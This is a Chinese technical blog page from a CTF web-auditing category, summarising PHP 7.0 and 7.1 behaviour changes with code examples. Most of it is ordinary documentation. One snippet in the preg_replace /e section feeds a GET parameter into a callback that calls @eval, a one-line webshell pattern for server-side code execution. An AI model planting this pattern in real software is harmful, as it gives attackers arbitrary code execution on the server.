<h2 id="JSON编码和解码"><a href="#JSON编码和解码" class="headerlink" title="JSON编码和解码"></a>JSON编码和解码</h2><p>解码一个空键值将会解析为一个空属性名，而之前会解析为<code>_empty_</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;&#x27;</span> =&gt; <span class="number">1</span>])));</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">PHP&lt;7.1</span></span><br><span class="line"><span class="comment">object(stdClass)#1 (1) &#123;</span></span><br><span class="line"><span class="comment">  [&quot;_empty_&quot;]=&gt;</span></span><br><span class="line"><span class="comment">  int(1)</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PHP7.1</span></span><br><span class="line"><span class="comment">object(stdClass)#1 (1) &#123;</span></span><br><span class="line"><span class="comment">  [&quot;&quot;]=&gt;</span></span><br><span class="line"><span class="comment">  int(1)</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><h2 id="可为空（Nullable）类型-¶"><a href="#可为空（Nullable）类型-¶" class="headerlink" title="可为空（Nullable）类型 ¶"></a>可为空（Nullable）类型<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration71.new-features.php#migration71.new-features.nullable-types"> ¶</a></h2><h2 id="Void-函数-¶"><a href="#Void-函数-¶" class="headerlink" title="Void 函数 ¶"></a>Void 函数<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration71.new-features.php#migration71.new-features.void-functions"> ¶</a></h2><h2 id="类常量可见性-¶"><a href="#类常量可见性-¶" class="headerlink" title="类常量可见性 ¶"></a>类常量可见性<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration71.new-features.php#migration71.new-features.class-constant-visibility"> ¶</a></h2><h2 id="iterable-伪类-¶"><a href="#iterable-伪类-¶" class="headerlink" title="iterable 伪类 ¶"></a><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.types.iterable.php">iterable</a> 伪类<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration71.new-features.php#migration71.new-features.iterable-pseudo-type"> ¶</a></h2><h2 id="多异常捕获处理-¶"><a href="#多异常捕获处理-¶" class="headerlink" title="多异常捕获处理 ¶"></a>多异常捕获处理<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration71.new-features.php#migration71.new-features.mulit-catch-exception-handling"> ¶</a></h2><h2 id="Invalid-class-interface-and-trait-names-¶"><a href="#Invalid-class-interface-and-trait-names-¶" class="headerlink" title="Invalid class, interface, and trait names ¶"></a>Invalid class, interface, and trait names<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.invalid-class-names"> ¶</a></h2><h2 id="Numerical-string-conversions-now-respect-scientific-notation-¶"><a href="#Numerical-string-conversions-now-respect-scientific-notation-¶" class="headerlink" title="Numerical string conversions now respect scientific notation ¶"></a>Numerical string conversions now respect scientific notation<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.numerical-strings-scientific-notation"> ¶</a></h2><h2 id="Fixes-to-mt-rand-algorithm-¶"><a href="#Fixes-to-mt-rand-algorithm-¶" class="headerlink" title="Fixes to mt_rand() algorithm ¶"></a>Fixes to <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.mt-rand.php">mt_rand()</a> algorithm<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.fixes-to-mt_rand-algorithm"> ¶</a></h2><h2 id="rand-aliased-to-mt-rand-and-srand-aliased-to-mt-srand-¶"><a href="#rand-aliased-to-mt-rand-and-srand-aliased-to-mt-srand-¶" class="headerlink" title="rand() aliased to mt_rand() and srand() aliased to mt_srand() ¶"></a><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.rand.php">rand()</a> aliased to <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.mt-rand.php">mt_rand()</a> and <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.srand.php">srand()</a> aliased to <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.mt-srand.php">mt_srand()</a> <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.rand-srand-aliases">¶</a></h2><h2 id="Disallow-the-ASCII-delete-control-character-in-identifiers-¶"><a href="#Disallow-the-ASCII-delete-control-character-in-identifiers-¶" class="headerlink" title="Disallow the ASCII delete control character in identifiers ¶"></a>Disallow the ASCII delete control character in identifiers<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.delete-control-character-in-identifiers"> ¶</a></h2><h2 id="在不完整的对象上不再调用析构方法-¶"><a href="#在不完整的对象上不再调用析构方法-¶" class="headerlink" title="在不完整的对象上不再调用析构方法 ¶"></a>在不完整的对象上不再调用析构方法<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.dont-call-destructors"> ¶</a></h2><h2 id="call-user-func-不再支持对传址的函数的调用-¶"><a href="#call-user-func-不再支持对传址的函数的调用-¶" class="headerlink" title="call_user_func()不再支持对传址的函数的调用 ¶"></a><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.call-user-func.php">call_user_func()</a>不再支持对传址的函数的调用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.call_user_func-with-ref-args">¶</a></h2><h2 id="ini配置项移除-¶"><a href="#ini配置项移除-¶" class="headerlink" title="ini配置项移除 ¶"></a>ini配置项移除<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.removed-ini-directives"> ¶</a></h2><h2 id="Sort-order-of-equal-elements"><a href="#Sort-order-of-equal-elements" class="headerlink" title="Sort order of equal elements"></a>Sort order of equal elements</h2><h2 id="Lexically-bound-variables-cannot-reuse-names-¶"><a href="#Lexically-bound-variables-cannot-reuse-names-¶" class="headerlink" title="Lexically bound variables cannot reuse names ¶"></a>Lexically bound variables cannot reuse names<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.lexical-names"> ¶</a></h2>
      
    </div>
    <footer class="article-footer">
      <a data-url="https://theganlove.github.io/2024/08/31/PHP7-1%E7%89%B9%E6%80%A7/" data-id="cm0kx5k540001o8dk07v1h90f" data-title="PHP7.1特性" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-php/" rel="tag">web php</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-PHP7-0特性" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/08/31/PHP7-0%E7%89%B9%E6%80%A7/" class="article-date">
  <time class="dt-published" datetime="2024-08-31T05:47:40.000Z" itemprop="datePublished">2024-08-31</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTF-web/">CTF-web</a>►<a class="article-category-link" href="/categories/CTF-web/php%E5%AE%A1%E8%AE%A1/">php审计</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/08/31/PHP7-0%E7%89%B9%E6%80%A7/">PHP7.0特性</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="函数变更"><a href="#函数变更" class="headerlink" title="函数变更"></a>函数变更</h1><p>参考：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/appendices.php">https://www.php.net/manual/zh/appendices.php</a></li>
<li><a target="_blank" rel="noopener" href="http://xiaoze.club/">http://xiaoze.club/</a></li>
</ul>
<h2 id="关于list处理方式的变更"><a href="#关于list处理方式的变更" class="headerlink" title="关于list处理方式的变更"></a>关于list处理方式的变更</h2><p><strong>list不再以反向的顺序来进行赋值</strong></p>
<p><code>list</code>现在会按照变量定义的顺序来给他们进行赋值，而非反过来的顺序。 通常来说，这只会影响<code>list</code>与数组的<code>[]</code>操作符一起使用的案例，如下所示：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">list</span>(<span class="variable">$a</span>[], <span class="variable">$a</span>[], <span class="variable">$a</span>[]) = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">PHP5</span><br><span class="line"><span class="keyword">array</span>(<span class="number">3</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">3</span>)</span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">2</span>)</span><br><span class="line">  [<span class="number">2</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PHP7</span><br><span class="line"><span class="keyword">array</span>(<span class="number">3</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">1</span>)</span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">2</span>)</span><br><span class="line">  [<span class="number">2</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">3</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>推荐不要依赖l<code>ist</code>的赋值顺序，因为这是一个在未来也许会变更的实现细节。</p>
<p><strong>list 结构现在不再能是空的</strong></p>
<p>list结构现在不再能是空的。如下的例子不再被允许：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="keyword">list</span>() = <span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="keyword">list</span>(,,) = <span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="keyword">list</span>(<span class="variable">$x</span>, <span class="keyword">list</span>(), <span class="variable">$y</span>) = <span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>list不再能解开string</strong></p>
<p><code>list</code>不再能解开字符串（string）变量。 你可以使用<code>str_split</code>来代替它</p>
<h2 id="foreach的变化"><a href="#foreach的变化" class="headerlink" title="foreach的变化"></a>foreach的变化</h2><p><code>foreach</code>发生了细微的变化，控制结构， 主要围绕阵列的内部数组指针和迭代处理的修改。</p>
<p><strong>foreach不再改变内部数组指针</strong></p>
<p>在PHP7之前，当数组通过<code>foreach</code>迭代时，数组指针会移动。现在开始，不再如此，见下面代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$array</span> = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$array</span> <span class="keyword">as</span> &amp;<span class="variable">$val</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">current</span>(<span class="variable">$array</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PHP5</span><br><span class="line"><span class="keyword">int</span>(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">int</span>(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br><span class="line">    </span><br><span class="line">PHP7</span><br><span class="line"><span class="keyword">int</span>(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">int</span>(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">int</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p><strong>foreach通过值遍历时，操作的值为数组的副本</strong></p>
<p>当默认使用通过值遍历数组时，<code>foreach</code>实际操作的是数组的迭代副本，而非数组本身。这就意味着，<code>foreach</code> 中的操作不会修改原数组的值。</p>
<p><strong>foreach通过引用遍历时，有更好的迭代特性</strong></p>
<p>当使用引用遍历数组时，现在 <code>foreach</code>在迭代中能更好的跟踪变化。例如，在迭代中添加一个迭代值到数组中，参考下面的代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$array</span> = [<span class="number">0</span>];</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$array</span> <span class="keyword">as</span> &amp;<span class="variable">$val</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$val</span>);</span><br><span class="line">    <span class="variable">$array</span>[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PHP5</span><br><span class="line">int(0)</span><br><span class="line"></span><br><span class="line">PHP7</span><br><span class="line">int(0)</span><br><span class="line">int(1)</span><br></pre></td></tr></table></figure>

<h2 id="filter-var转换十六进制数字"><a href="#filter-var转换十六进制数字" class="headerlink" title="filter_var转换十六进制数字"></a>filter_var转换十六进制数字</h2><p><code>filter_var</code> 函数可以用于检查一个 <code>string</code> 是否含有十六进制数字,并将其转换为<code>integer</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;0xffff&quot;</span>;</span><br><span class="line"><span class="variable">$int</span> = <span class="title function_ invoke__">filter_var</span>(<span class="variable">$str</span>, FILTER_VALIDATE_INT, FILTER_FLAG_ALLOW_HEX);</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$int</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Invalid integer!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$int</span>); <span class="comment">// int(65535)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="通过-define-定义常量数组"><a href="#通过-define-定义常量数组" class="headerlink" title="通过 define 定义常量数组"></a>通过 define 定义常量数组</h2><p>Array 类型的常量现在可以通过 <code>define()</code> 来定义。在 PHP5.6 中仅能通过 <code>const</code> 定义。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>define(<span class="string">&#x27;ANIMALS&#x27;</span>, [    <span class="string">&#x27;dog&#x27;</span>,    <span class="string">&#x27;cat&#x27;</span>,    <span class="string">&#x27;bird&#x27;</span>]);<span class="keyword">echo</span> ANIMALS[<span class="number">1</span>]; <span class="comment">// 输出 &quot;cat&quot;?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="为unserialize-提供过滤"><a href="#为unserialize-提供过滤" class="headerlink" title="为unserialize()提供过滤"></a>为unserialize()提供过滤</h2><p>这个特性旨在提供更安全的方式解包不可靠的数据。它通过白名单的方式来防止潜在的代码注入。</p>
<p>可选白名单参数也可以是布尔数据，如果是FALSE就会将所有的对象都转换为<code>__PHP_Incomplete_Class</code>对象。TRUE是无限制。也可以传入类名实现白名单。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="keyword">class</span> a&#123;	<span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;123&#x27;</span>;&#125;<span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">a</span>();<span class="variable">$ser</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);<span class="variable">$unse</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>,[<span class="string">&quot;allowed_classes&quot;</span> =&gt; <span class="literal">false</span>]);<span class="title function_ invoke__">print_r</span>(<span class="variable">$unse</span>);<span class="variable">$unse</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>,[<span class="string">&quot;allowed_classes&quot;</span> =&gt; <span class="literal">true</span>]);<span class="title function_ invoke__">print_r</span>(<span class="variable">$unse</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/Users/j7ur8/WebBook/BookBuild/images/19-7-22_PHP_PHP7%E5%92%8CPHP5%E7%9A%84%E5%8C%BA%E5%88%AB_%E5%87%BD%E6%95%B0%E6%96%B9%E9%9D%A2_2.png"></p>
<h2 id="session-start可以加入一个数组"><a href="#session-start可以加入一个数组" class="headerlink" title="session_start可以加入一个数组"></a>session_start可以加入一个数组</h2><p><code>session_start()</code> 可以接受一个 <code>array</code> 作为参数， 用来覆盖 php.ini 文件中设置的 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/session.configuration.php">会话配置选项</a>。</p>
<p>在调用 <code>session_start()</code> 的时候， 传入的选项参数中也支持 <code>session.lazy_write</code> 行为， 默认情况下这个配置项是打开的。它的作用是控制 PHP 只有在会话中的数据发生变化的时候才 写入会话存储文件，如果会话中的数据没有发生改变，那么 PHP 会在读取完会话数据之后， 立即关闭会话存储文件，不做任何修改，可以通过设置 <code>read_and_close</code>来实现。</p>
<p>例如，下列代码设置 <code>session.cache_limiter</code> 为 <em>private</em>，并且在读取完毕会话数据之后马上关闭会话存储文件。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>session_start([    <span class="string">&#x27;cache_limiter&#x27;</span> =&gt; <span class="string">&#x27;private&#x27;</span>,    <span class="string">&#x27;read_and_close&#x27;</span> =&gt; <span class="literal">true</span>,]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="preg-replaces不再支持-e修饰符"><a href="#preg-replaces不再支持-e修饰符" class="headerlink" title="preg_replaces不再支持&#x2F;e修饰符"></a>preg_replaces不再支持&#x2F;e修饰符</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="variable">$_GET</span>[<span class="string">&quot;h&quot;</span>]=<span class="title function_ invoke__">phpinfo</span>();<span class="title function_ invoke__">preg_replace_callback</span>(<span class="string">&quot;/.*/&quot;</span>,function (<span class="variable">$a</span>)&#123;@<span class="keyword">eval</span>(<span class="variable">$a</span>[<span class="number">0</span>]);&#125;,<span class="variable">$_GET</span>[<span class="string">&quot;h&quot;</span>]);</span><br></pre></td></tr></table></figure>

<p><img src="/Users/j7ur8/WebBook/BookBuild/images/19-7-22_PHP_PHP7%E5%92%8CPHP5%E7%9A%84%E5%8C%BA%E5%88%AB_%E5%87%BD%E6%95%B0%E6%96%B9%E9%9D%A2_1.png"></p>
<p>但是有新的函数<code>preg_replace_callback</code></p>
<h2 id="dirname增加了参数"><a href="#dirname增加了参数" class="headerlink" title="dirname增加了参数"></a>dirname增加了参数</h2><p><code>dirname()</code> 增加了可选的第二个参数, <code>depth</code>, 获取当前目录向上 <code>depth</code> 级父目录的名称</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="variable">$a</span>=<span class="title function_ invoke__">dirname</span>(<span class="string">&#x27;c:/a/b/c/d&#x27;</span>,<span class="number">1</span>);<span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>);<span class="comment">#结果/*c:/a/b/c*/</span></span><br></pre></td></tr></table></figure>

<h2 id="system等函数对NULL增加了保护"><a href="#system等函数对NULL增加了保护" class="headerlink" title="system等函数对NULL增加了保护."></a>system等函数对NULL增加了保护.</h2><p><code>exec()</code>, <code>system()</code> and <code>passthru()</code> 函数对 NULL 增加了保护（我也不知道啥意思。</p>
<h2 id="增加整数除法函数-intdiv"><a href="#增加整数除法函数-intdiv" class="headerlink" title="增加整数除法函数 intdiv"></a>增加整数除法函数 intdiv</h2><p>新加的函数 <code>intdiv()</code> 用来进行 整数的除法运算。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>var_dump(<span class="title function_ invoke__">intdiv</span>(<span class="number">10</span>, <span class="number">3</span>));<span class="comment">// int(3)?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="增加preg-replace-callback-array"><a href="#增加preg-replace-callback-array" class="headerlink" title="增加preg_replace_callback_array"></a>增加preg_replace_callback_array</h2><p>在 PHP 7 之前，当使用 <code>preg_replace_callback()</code> 函数的时候， 由于针对每个正则表达式都要执行回调函数，可能导致过多的分支代码。 而使用新加的 <code>preg_replace_callback_array()</code> 函数， 可以使得代码更加简洁。</p>
<p>现在，可以使用一个关联数组来对每个正则表达式注册回调函数， 正则表达式本身作为关联数组的键， 而对应的回调函数就是关联数组的值。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="variable">$subject</span> = <span class="string">&#x27;Aaaaaa Bbb&#x27;</span>;<span class="title function_ invoke__">preg_replace_callback_array</span>(    [        <span class="string">&#x27;~[a]+~i&#x27;</span> =&gt; function (<span class="variable">$match</span>) &#123;            <span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$match</span>[<span class="number">0</span>]), <span class="string">&#x27; matches for &quot;a&quot; found&#x27;</span>, PHP_EOL;        &#125;,        <span class="string">&#x27;~[b]+~i&#x27;</span> =&gt; <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$match</span></span>) </span>&#123;            <span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$match</span>[<span class="number">0</span>]), <span class="string">&#x27; matches for &quot;b&quot; found&#x27;</span>, PHP_EOL;        &#125;    ],    <span class="variable">$subject</span>);    <span class="comment">/*6 matches for &quot;a&quot; found3 matches for &quot;b&quot; found*/</span></span><br></pre></td></tr></table></figure>

<h2 id="增加Closure-call"><a href="#增加Closure-call" class="headerlink" title="增加Closure::call()"></a>增加Closure::call()</h2><p><strong>Closure::call()</strong> 现在有着更好的性能，简短干练的暂时绑定一个方法到对象上闭包并调用它。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="keyword">class</span> A &#123;<span class="keyword">private</span> <span class="variable">$x</span> = <span class="number">1</span>;&#125;<span class="comment">// PHP 7 之前版本的代码$getXCB = function() &#123;return $this-&gt;x;&#125;;$getX = $getXCB-&gt;bindTo(new A, &#x27;A&#x27;); // 中间层闭包echo $getX();// PHP 7+ 及更高版本的代码$getX = function() &#123;return $this-&gt;x;&#125;;echo $getX-&gt;call(new A);#结果/*11*/</span></span><br></pre></td></tr></table></figure>

<h2 id="被移除的函数"><a href="#被移除的函数" class="headerlink" title="被移除的函数"></a>被移除的函数</h2><ul>
<li><p><code>call_user_method</code>和<code>call_user_method_array</code></p>
</li>
<li><p>所有的<code>ereg*</code>函数</p>
</li>
<li><p><code>mcrypt</code>的一部分废弃函数</p>
</li>
<li><p>所有<code>ext/mysql</code>函数</p>
</li>
<li><p>所有<code>ext/mssql</code>函数</p>
</li>
<li><p>dl in PHP-FPM</p>
<p>dl()在 PHP-FPM 不再可用，在 CLI 和 embed SAPIs 中仍可用。</p>
</li>
</ul>
<h1 id="语法变更"><a href="#语法变更" class="headerlink" title="语法变更"></a>语法变更</h1><h2 id="关于变量处理的变化"><a href="#关于变量处理的变化" class="headerlink" title="关于变量处理的变化"></a>关于变量处理的变化</h2><p>PHP 7 现在使用了抽象语法树来解析源代码。这使得许多由于之前的PHP的解释器的限制所不可能实现的改进得以实现。 但出于一致性的原因导致了一些特殊例子的变动，而这些变动打破了向后兼容。 在这一章中将详细介绍这些例子。</p>
<h2 id="关于间接使用变量、属性和方法的变化"><a href="#关于间接使用变量、属性和方法的变化" class="headerlink" title="关于间接使用变量、属性和方法的变化"></a>关于间接使用变量、属性和方法的变化</h2><p>对变量、属性和方法的间接调用现在将严格遵循从左到右的顺序来解析，而不是之前的混杂着几个特殊案例的情况。 下面这张表说明了这个解析顺序的变化。</p>
<p>​										<strong>间接调用的表达式的新旧解析顺序</strong></p>
<table>
<thead>
<tr>
<th align="left">表达式</th>
<th align="left">PHP 5 的解析方式</th>
<th align="left">PHP 7 的解析方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>$$foo[&#39;bar&#39;][&#39;baz&#39;]</code></td>
<td align="left"><code>$&#123;$foo[&#39;bar&#39;][&#39;baz&#39;]&#125;</code></td>
<td align="left"><code>($$foo)[&#39;bar&#39;][&#39;baz&#39;]</code></td>
</tr>
<tr>
<td align="left"><code>$foo-&gt;$bar[&#39;baz&#39;]</code></td>
<td align="left"><code>$foo-&gt;&#123;$bar[&#39;baz&#39;]&#125;</code></td>
<td align="left"><code>($foo-&gt;$bar)[&#39;baz&#39;]</code></td>
</tr>
<tr>
<td align="left"><code>$foo-&gt;$bar[&#39;baz&#39;]()</code></td>
<td align="left"><code>$foo-&gt;&#123;$bar[&#39;baz&#39;]&#125;()</code></td>
<td align="left"><code>($foo-&gt;$bar)[&#39;baz&#39;]()</code></td>
</tr>
<tr>
<td align="left"><code>Foo::$bar[&#39;baz&#39;]()</code></td>
<td align="left"><code>Foo::&#123;$bar[&#39;baz&#39;]&#125;()</code></td>
<td align="left"><code>(Foo::$bar)[&#39;baz&#39;]()</code></td>
</tr>
</tbody></table>
<p>使用了旧的从右到左的解析顺序的代码必须被重写，明确的使用大括号来表明顺序（参见上表中间一列）。 这样使得代码既保持了与PHP 7.x的前向兼容性，又保持了与PHP 5.x的后向兼容性。</p>
<p>这同样影响了<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.variables.scope.php#language.variables.scope.global"><strong>global</strong></a> 关键字。如果需要的话可以使用大括号来模拟之前的行为。</p>
